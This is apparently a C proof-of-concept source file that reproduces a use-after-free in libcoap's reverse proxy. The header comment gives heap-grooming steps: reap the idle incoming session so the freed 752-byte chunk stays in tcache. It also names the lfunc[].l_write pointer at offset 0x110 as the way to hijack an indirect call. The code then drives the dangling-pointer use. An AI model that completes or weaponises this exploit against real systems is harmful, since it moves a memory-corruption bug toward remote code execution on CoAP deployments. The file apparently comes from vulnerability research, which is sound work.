/*
 * Bug B exploitation prep — trigger the proxy UAF via the IDLE-REAP free path
 * (coap_io.c:1402-1409) instead of max-idle eviction (coap_session.c:1123).
 *
 * Why: the eviction path frees the incoming session and IMMEDIATELY allocates a
 * replacement session (coap_session.c:1213, same 752B size class), so under real
 * glibc the freed slot is instantly reclaimed by a valid session -> the dangling
 * pointer aliases a live session (type confusion), NOT attacker bytes. The idle
 * reap frees the session during the io tick with NO replacement allocation, so
 * the 752B chunk goes to tcache and STAYS free -> groomable. This is the
 * precondition for landing controlled bytes in the slot (the lfunc[].l_write
 * hijack at offset 0x110 -> control of the indirect call at coap_net.c:1006).
 *
 * The incoming session is internal to the proxy, so for the actual refill we
 * drive it under gdb (which stands in for an attacker same-size allocation
 * winning the freed tcache slot). This file just establishes the groomable
 * trigger and the UAF use.
 *
 * Build (ASan, confirm the UAF fires via the reap path):
 *   make poc-bug-b-groom
 * Build (non-ASan, for the gdb refill demo):
 *   cc -g -O0 -fno-omit-frame-pointer poc-bug-b-groom.c \
 *      -I<libcoap>/include <libcoap>/.libs/libcoap-3-notls.a -o pbg-noasan
 */
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <coap3/coap.h>

#define ORIGIN_PORT 5701
#define PROXY_PORT  5700

static coap_proxy_server_t      rp_entry;
static coap_proxy_server_list_t reverse_proxy = {
    .entry = &rp_entry,
    .entry_count = 1,
    .type = COAP_PROXY_REVERSE,
    .track_client_session = 0,
};

static void
origin_get(coap_resource_t *r COAP_UNUSED, coap_session_t *s COAP_UNUSED,
           const coap_pdu_t *req COAP_UNUSED, const coap_string_t *q COAP_UNUSED,
           coap_pdu_t *resp) {
  coap_pdu_set_code(resp, COAP_RESPONSE_CODE_CONTENT);
  coap_add_data(resp, 5, (const uint8_t *)"hello");
}

static void
proxy_handler(coap_resource_t *res, coap_session_t *s, const coap_pdu_t *req,
              const coap_string_t *q COAP_UNUSED, coap_pdu_t *resp) {
  if (!coap_proxy_forward_request(s, req, resp, res, NULL, &reverse_proxy))
    fprintf(stderr, "forward_request failed\n");
}

static coap_response_t
proxy_response(coap_session_t *s, const coap_pdu_t *sent COAP_UNUSED,
               const coap_pdu_t *recv, const coap_mid_t id COAP_UNUSED) {
  return coap_proxy_forward_response(s, recv, NULL);
}

static coap_context_t *
make_server(uint16_t port) {
  coap_context_t *ctx = coap_new_context(NULL);
  coap_address_t a;
  coap_address_init(&a);
  a.addr.sin.sin_family = AF_INET;
  a.addr.sin.sin_port = htons(port);
  a.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (!coap_new_endpoint(ctx, &a, COAP_PROTO_UDP)) {
    fprintf(stderr, "endpoint on %u failed\n", port);
    exit(1);
  }
  return ctx;
}

static coap_session_t *
make_client(coap_context_t *ctx, uint16_t dst_port) {
  coap_address_t d;
  coap_address_init(&d);
  d.addr.sin.sin_family = AF_INET;
  d.addr.sin.sin_port = htons(dst_port);
  d.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  return coap_new_client_session(ctx, NULL, &d, COAP_PROTO_UDP);
}

static void
send_get(coap_session_t *s, const uint8_t *tok, size_t toklen) {
  coap_pdu_t *p = coap_new_pdu(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET, s);
  coap_add_token(p, toklen, tok);
  coap_add_option(p, COAP_OPTION_URI_PATH, 4, (const uint8_t *)"test");
  coap_send(s, p);
}

static void
pump(int n, coap_context_t **ctxs) {
  for (int i = 0; i < n; i++)
    for (coap_context_t **c = ctxs; *c; c++)
      coap_io_process(*c, COAP_IO_NO_WAIT);
}

int
main(void) {
  coap_startup();
  coap_set_log_level(COAP_LOG_WARN);

  static uint8_t uri_buf[] = "coap://127.0.0.1:5701";
  coap_uri_t uri;
  coap_split_uri(uri_buf, strlen((char *)uri_buf), &uri);
  rp_entry.uri = uri;

  coap_context_t *origin = make_server(ORIGIN_PORT);
  coap_resource_t *ores = coap_resource_init(coap_make_str_const("test"), 0);
  coap_register_request_handler(ores, COAP_REQUEST_GET, origin_get);
  coap_add_resource(origin, ores);

  coap_context_t *proxy = make_server(PROXY_PORT);
  /* Short idle timeout so the incoming session is REAPED (coap_io.c:1409),
   * not evicted. No max_idle_sessions trick, no 2nd client. */
  coap_context_set_session_timeout(proxy, 1);
  coap_add_resource(proxy, coap_resource_reverse_proxy_init(proxy_handler, 0));
  coap_register_response_handler(proxy, proxy_response);
  /* No coap_register_event_handler() -> proxy cleanup gated off (Bug B). */

  coap_context_t *client = coap_new_context(NULL);

  /* 1. Client S sends one GET; proxy forwards upstream. ORIGIN is withheld
   *    (not pumped) so the proxy_req entry stays in flight. */
  coap_session_t *S = make_client(client, PROXY_PORT);
  send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
  { coap_context_t *cp[] = {client, proxy, NULL}; pump(12, cp); }

  /* 2. Let the proxy's incoming server session go idle past session_timeout,
   *    then pump ONLY the proxy so the io tick reaps it (free, no realloc). */
  { struct timespec ts = { 2, 0 }; nanosleep(&ts, NULL); }
  { coap_context_t *cp[] = {proxy, NULL}; pump(4, cp); }

  /* 3. Now release the upstream response. The proxy forwards it through the
   *    dangling incoming pointer -> use-after-free (slot was groomable). */
  { coap_context_t *all[] = {origin, proxy, client, NULL}; pump(40, all); }

  coap_free_context(client);
  coap_free_context(proxy);
  coap_free_context(origin);
  coap_cleanup();
  return 0;
}
